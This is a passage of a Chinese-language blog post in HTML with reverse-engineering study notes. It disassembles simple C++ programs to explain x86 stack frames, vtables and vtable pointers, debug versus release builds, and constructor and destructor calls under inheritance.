    mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">00EB13D1    0345 0C         add     eax,dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">00EB13D4    5F              pop     edi                                     ; 0038FB84</span><br><span class=\"line\">00EB13D5    5E              pop     esi</span><br><span class=\"line\">00EB13D6    5B              pop     ebx</span><br><span class=\"line\">00EB13D7    8BE5            mov     esp,ebp</span><br><span class=\"line\">00EB13D9    5D              pop     ebp</span><br><span class=\"line\">00EB13DA    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"进制与内存单元长度修饰\"><a class=\"markdownIt-Anchor\" href=\"#进制与内存单元长度修饰\">#</a> 进制与内存单元长度修饰</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add [ebx],0x333</span><br><span class=\"line\">然在实际汇编出来： add byte ptr [ebx], 33</span><br><span class=\"line\"></span><br><span class=\"line\">eax是双字</span><br><span class=\"line\">内存单元访问，默认byte</span><br><span class=\"line\">因此会截断</span><br></pre></td></tr></table></figure>\n<h2 id=\"从逆向的角度看c\"><a class=\"markdownIt-Anchor\" href=\"#从逆向的角度看c\">#</a> 从逆向的角度看 C++</h2>\n<h3 id=\"虚函数\"><a class=\"markdownIt-Anchor\" href=\"#虚函数\">#</a> 虚函数</h3>\n<ul>\n<li><strong>虚函数地址表（虚表）</strong></li>\n</ul>\n<ol>\n<li>\n<ol>\n<li>定义：当类中定义有虚函数时，编译器会把该类中所有虚函数的首地址保存在一张地址表中，即虚函数地址表。</li>\n<li>虚表信息在编译后被链接到执行文件中，因此所获得的虚表地址是一个固定的地址。</li>\n<li>虚表中虚函数的地址排列顺序依据虚函数在类中的声明顺序而定。</li>\n</ol>\n</li>\n</ol>\n<ul>\n<li>\n<p><strong>虚表指针</strong></p>\n</li>\n<li>\n<ul>\n<li>同时编译器还会在类的每个对象添加一个隐藏数据成员，称为虚表指针，保存着虚表的首地址，用于记录和查找虚函数。</li>\n<li>虚表指针的初始化是通过编译器在构造函数中插入代码实现的。由于必须初始化虚表指针，编译器会提供默认的构造函数。</li>\n</ul>\n</li>\n<li>\n<p><strong>虚函数调用过程</strong></p>\n</li>\n<li>\n<ul>\n<li>虚表间接寻址访问：<br>\n使用对象的指针或引用调用虚函数。根据对象的首地址，取出相应的虚表指针，在虚表查找对应的虚函数的首地址，并调用执行。</li>\n<li>直接调用访问：<br>\n使用对象调用虚函数，和调用普通成员函数一样。</li>\n<li>虚函数的识别：</li>\n<li>类中隐式定义一个数据成员</li>\n<li>数据成员在首地址处，占 4 字节</li>\n<li>构造函数初始化该数据成员为某个数组的首地址</li>\n<li>地址属于数据区，相对固定的地址</li>\n<li>数组的成员是函数指针</li>\n<li>函数被调用方式是 thiscall</li>\n<li>构造函数与析构函数都会将虚表指针设置为当前对象所属类中的虚表地址。</li>\n<li>构造函数中是完成虚表指针的初始化，此时虚表指针并没有指向虚表函数。</li>\n<li>执行析构函数时，其对象的虚表指针已经指向某个虚表首地址。虚函数是在还原虚表指针，让其指向自身的虚表首地址，防止在析构函数中调用虚函数时取到非自身虚表</li>\n</ul>\n</li>\n</ul>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654326102652-35f05218-3401-41f7-a10f-3e70d9aed416.png\" alt=\"img\"></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654326120551-f6cd8e66-fc26-40bd-8d23-a8f6b93c7805.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">class base_class</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">    int m_base;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    virtual void v_func1()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;This is base_class&#x27;s v_func1()&quot; &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    virtual void v_func2()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;This is base_class&#x27;s v_func2()&quot; &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    virtual void v_func3()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;This is base_class&#x27;s v_func3()&quot; &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tbase_class Myclass;</span><br><span class=\"line\">\tMyclass.v_func1();</span><br><span class=\"line\">\tMyclass.v_func2();</span><br><span class=\"line\">\tMyclass.v_func3();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>对应的汇编为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000A1520 &gt;  55              push    ebp</span><br><span class=\"line\">000A1521    8BEC            mov     ebp,esp</span><br><span class=\"line\">000A1523    81EC D0000000   sub     esp,0xD0</span><br><span class=\"line\">000A1529    53              push    ebx</span><br><span class=\"line\">000A152A    56              push    esi</span><br><span class=\"line\">000A152B    57              push    edi</span><br><span class=\"line\">000A152C    8DBD 30FFFFFF   lea     edi,dword ptr ss:[ebp-0xD0]</span><br><span class=\"line\">000A1532    B9 34000000     mov     ecx,0x34</span><br><span class=\"line\">000A1537    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">000A153C    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">000A153E    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1541    E8 A4FCFFFF     call    000A11EA</span><br><span class=\"line\"></span><br><span class=\"line\">000A1546    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1549    E8 D0FAFFFF     call    000A101E</span><br><span class=\"line\"></span><br><span class=\"line\">000A154E    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1551    E8 62FCFFFF     call    000A11B8</span><br><span class=\"line\"></span><br><span class=\"line\">000A1556    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1559    E8 3CFCFFFF     call    000A119A</span><br><span class=\"line\"></span><br><span class=\"line\">000A155E    33C0            xor     eax,eax</span><br><span class=\"line\">000A1560    52              push    edx</span><br><span class=\"line\">000A1561    8BCD            mov     ecx,ebp</span><br><span class=\"line\">000A1563    50              push    eax</span><br><span class=\"line\">000A1564    8D15 88150A00   lea     edx,dword ptr ds:[0xA1588]</span><br><span class=\"line\">000A156A    E8 4FFBFFFF     call    000A10BE</span><br><span class=\"line\">000A156F    58              pop     eax</span><br><span class=\"line\">000A1570    5A              pop     edx</span><br><span class=\"line\">000A1571    5F              pop     edi</span><br><span class=\"line\">000A1572    5E              pop     esi</span><br><span class=\"line\">000A1573    5B              pop     ebx</span><br><span class=\"line\">000A1574    81C4 D0000000   add     esp,0xD0</span><br><span class=\"line\">000A157A    3BEC            cmp     ebp,esp</span><br><span class=\"line\">000A157C    E8 50FCFFFF     call    000A11D1</span><br><span class=\"line\">000A1581    8BE5            mov     esp,ebp</span><br><span class=\"line\">000A1583    5D              pop     ebp</span><br><span class=\"line\">000A1584    C3              retn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//000A11EA处的代码为</span><br><span class=\"line\">013E11EA   /E9 61050000     jmp     base_class::base_class</span><br><span class=\"line\"></span><br><span class=\"line\">013E1750 &gt;  55              push    ebp</span><br><span class=\"line\">013E1751    8BEC            mov     ebp,esp</span><br><span class=\"line\">013E1753    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">013E1759    53              push    ebx</span><br><span class=\"line\">013E175A    56              push    esi</span><br><span class=\"line\">013E175B    57              push    edi</span><br><span class=\"line\">013E175C    51              push    ecx</span><br><span class=\"line\">013E175D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">013E1763    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">013E1768    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">013E176D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">013E176F    59              pop     ecx</span><br><span class=\"line\">013E1770    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">013E1773    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">013E1776    C700 7C783E01   mov     dword ptr ds:[eax],offset base_class::`vftable&#x27;</span><br><span class=\"line\">//此处为虚表的虚表指针eax中的值就是vftable的指针</span><br><span class=\"line\">013E177C    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">013E177F    5F              pop     edi</span><br><span class=\"line\">013E1780    5E              pop     esi</span><br><span class=\"line\">013E1781    5B              pop     ebx</span><br><span class=\"line\">013E1782    8BE5            mov     esp,ebp</span><br><span class=\"line\">013E1784    5D              pop     ebp</span><br><span class=\"line\">013E1785    C3              retn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//000A101E处的代码为</span><br><span class=\"line\">013E101E   /E9 AD050000     jmp     base_class::v_func1</span><br><span class=\"line\"></span><br><span class=\"line\">013E15D0 &gt;  55              push    ebp</span><br><span class=\"line\">013E15D1    8BEC            mov     ebp,esp</span><br><span class=\"line\">013E15D3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">013E15D9    53              push    ebx</span><br><span class=\"line\">013E15DA    56              push    esi</span><br><span class=\"line\">013E15DB    57              push    edi</span><br><span class=\"line\">013E15DC    51              push    ecx</span><br><span class=\"line\">013E15DD    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">013E15E3    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">013E15E8    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">013E15ED    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">013E15EF    59              pop     ecx</span><br><span class=\"line\">013E15F0    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">013E15F3    8BF4            mov     esi,esp</span><br><span class=\"line\">013E15F5    A1 10B33E01     mov     eax,dword ptr ds:[&lt;&amp;MSVCP90D.std::endl&gt;]</span><br><span class=\"line\">013E15FA    50              push    eax</span><br><span class=\"line\">013E15FB    68 00783E01     push    013E7800                                                                                     ; ASCII 54,&quot;his is base_class&#x27;s v_func1()&quot;</span><br><span class=\"line\">013E1600    8B0D 0CB33E01   mov     ecx,dword ptr ds:[&lt;&amp;MSVCP90D.std::cout&gt;]                                                     ; msvcp90d.std::cout</span><br><span class=\"line\">013E1606    51              push    ecx</span><br><span class=\"line\">013E1607    E8 6BFBFFFF     call    013E1177</span><br><span class=\"line\">013E160C    83C4 08         add     esp,0x8</span><br><span class=\"line\">013E160F    8BC8            mov     ecx,eax</span><br><span class=\"line\">013E1611    FF15 08B33E01   call    dword ptr ds:[&lt;&amp;MSVCP90D.std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt;&gt;]      ; msvcp90d.std::basic_ostream&lt;wchar_t,std::char_traits&lt;wchar_t&gt; &gt;::operator&lt;&lt;</span><br><span class=\"line\">013E1617    3BF4            cmp     esi,esp</span><br><span class=\"line\">013E1619    E8 B3FBFFFF     call    013E11D1</span><br><span class=\"line\">013E161E    5F              pop     edi</span><br><span class=\"line\">013E161F    5E              pop     esi</span><br><span class=\"line\">013E1620    5B              pop     ebx</span><br><span class=\"line\">013E1621    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">013E1627    3BEC            cmp     ebp,esp</span><br><span class=\"line\">013E1629    E8 A3FBFFFF     call    013E11D1</span><br><span class=\"line\">013E162E    8BE5            mov     esp,ebp</span><br><span class=\"line\">013E1630    5D              pop     ebp</span><br><span class=\"line\">013E1631    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\">000A11B8</span><br><span class=\"line\">000A119A</span><br><span class=\"line\">分别是func2和func3的代码</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109211943483.png\" alt=\"image-20221109211943483\"></p>\n<h3 id=\"debug版本和release版本\"><a class=\"markdownIt-Anchor\" href=\"#debug版本和release版本\">#</a> debug 版本和 release 版本</h3>\n<p>debug 版本：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109212625495.png\" alt=\"image-20221109212625495\"></p>\n<p>release 版本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109212653171.png\" alt=\"image-20221109212653171\"></p>\n<p>debug main</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654330003859-a991baf8-cefe-46fb-83c2-602148a95ba5.png\" alt=\"img\"></p>\n<p>release main</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109213010383.png\" alt=\"image-20221109213010383\"></p>\n<p>对于刚刚的虚函数</p>\n<p>debug</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109213138880.png\" alt=\"image-20221109213138880\"></p>\n<p>release</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109213209477.png\" alt=\"image-20221109213209477\"></p>\n<h3 id=\"c中类与继承在汇编中的关系\"><a class=\"markdownIt-Anchor\" href=\"#c中类与继承在汇编中的关系\">#</a> C++ 中类与继承在汇编中的关系</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">class employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\temployee() &#123; printf(&quot;employee()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~employee() &#123; printf(&quot;~employee()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">class manager : public employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tmanager() &#123; printf(&quot;manager()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~manager() &#123;  printf(&quot;~maneger()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tmanager my;</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010D13D0 &gt;  55              push    ebp</span><br><span class=\"line\">010D13D1    8BEC            mov     ebp,esp</span><br><span class=\"line\">010D13D3    81EC D8000000   sub     esp,0xD8</span><br><span class=\"line\">010D13D9    53              push    ebx</span><br><span class=\"line\">010D13DA    56              push    esi</span><br><span class=\"line\">010D13DB    57              push    edi</span><br><span class=\"line\">010D13DC    8DBD 28FFFFFF   lea     edi,dword ptr ss:[ebp-0xD8]</span><br><span class=\"line\">010D13E2    B9 36000000     mov     ecx,0x36</span><br><span class=\"line\">010D13E7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">010D13EC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">//堆栈操作</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D13EE    8D4D FB         lea     ecx,dword ptr ss:[ebp-0x5]</span><br><span class=\"line\">010D13F1    E8 22FDFFFF     call    010D1118</span><br><span class=\"line\">//010D1118   /E9 63030000     jmp     manager::manager</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D13F6    8BF4            mov     esi,esp</span><br><span class=\"line\">010D13F8    FF15 C4820D01   call    dword ptr ds:[&lt;&amp;MSVCR90D.getchar&gt;]        ; msvcr90d.getchar</span><br><span class=\"line\">010D13FE    3BF4            cmp     esi,esp</span><br><span class=\"line\">010D1400    E8 54FDFFFF     call    010D1159</span><br><span class=\"line\">010D1405    C785 2CFFFFFF 0&gt;mov     dword ptr ss:[ebp-0xD4],0x0</span><br><span class=\"line\">010D140F    8D4D FB         lea     ecx,dword ptr ss:[ebp-0x5]</span><br><span class=\"line\">010D1412    E8 11FCFFFF     call    010D1028</span><br><span class=\"line\">//010D1028   /E9 33050000     jmp     manager::~manager</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D1417    8B85 2CFFFFFF   mov     eax,dword ptr ss:[ebp-0xD4]</span><br><span class=\"line\">010D141D    52              push    edx</span><br><span class=\"line\">010D141E    8BCD            mov     ecx,ebp</span><br><span class=\"line\">010D1420    50              push    eax</span><br><span class=\"line\">010D1421    8D15 44140D01   lea     edx,dword ptr ds:[0x10D1444]</span><br><span class=\"line\">010D1427    E8 6AFCFFFF     call    010D1096</span><br><span class=\"line\">010D142C    58              pop     eax</span><br><span class=\"line\">010D142D    5A              pop     edx</span><br><span class=\"line\">010D142E    5F              pop     edi</span><br><span class=\"line\">010D142F    5E              pop     esi</span><br><span class=\"line\">010D1430    5B              pop     ebx</span><br><span class=\"line\">010D1431    81C4 D8000000   add     esp,0xD8</span><br><span class=\"line\">010D1437    3BEC            cmp     ebp,esp</span><br><span class=\"line\">010D1439    E8 1BFDFFFF     call    010D1159</span><br><span class=\"line\">010D143E    8BE5            mov     esp,ebp</span><br><span class=\"line\">010D1440    5D              pop     ebp</span><br><span class=\"line\">010D1441    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010D1118</span><br><span class=\"line\">010D1118   /E9 63030000     jmp     manager::manager</span><br><span class=\"line\"></span><br><span class=\"line\">010D1480 &gt;  55              push    ebp</span><br><span class=\"line\">010D1481    8BEC            mov     ebp,esp</span><br><span class=\"line\">010D1483    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">010D1489    53              push    ebx</span><br><span class=\"line\">010D148A    56              push    esi</span><br><span class=\"line\">010D148B    57              push    edi</span><br><span class=\"line\">010D148C    51              push    ecx</span><br><span class=\"line\">010D148D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">010D1493    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">010D1498    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">010D149D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">010D149F    59              pop     ecx</span><br><span class=\"line\">010D14A0    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">010D14A3    8B4D F8         mov     ecx,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">010D14A6    E8 FAFBFFFF     call    010D10A5</span><br><span class=\"line\">//010D10A5   /E9 46040000     jmp     employee::employee</span><br><span class=\"line\"></span><br><span class=\"line\">-</span><br><span class=\"line\">010D14AB    8BF4            mov     esi,esp</span><br><span class=\"line\">010D14AD    68 3C570D01     push    010D573C                              ; ASCII &quot;manager()!\\n&quot;</span><br><span class=\"line\">010D14B2    FF15 BC820D01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">010D14B8    83C4 04         add     esp,0x4</span><br><span class=\"line\">010D14BB    3BF4            cmp     esi,esp</span><br><span class=\"line\">010D14BD    E8 97FCFFFF     call    010D1159</span><br><span class=\"line\">010D14C2    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">010D14C5    5F              pop     edi</span><br><span class=\"line\">010D14C6    5E              pop     esi</span><br><span class=\"line\">010D14C7    5B              pop     ebx</span><br><span class=\"line\">010D14C8    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">010D14CE    3BEC            cmp     ebp,esp</span><br><span class=\"line\">010D14D0    E8 84FCFFFF     call    010D1159</span><br><span class=\"line\">010D14D5    8BE5            mov     esp,ebp</span><br><span class=\"line\">010D14D7    5D              pop     ebp</span><br><span class=\"line\">010D14D8    C3              retn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span 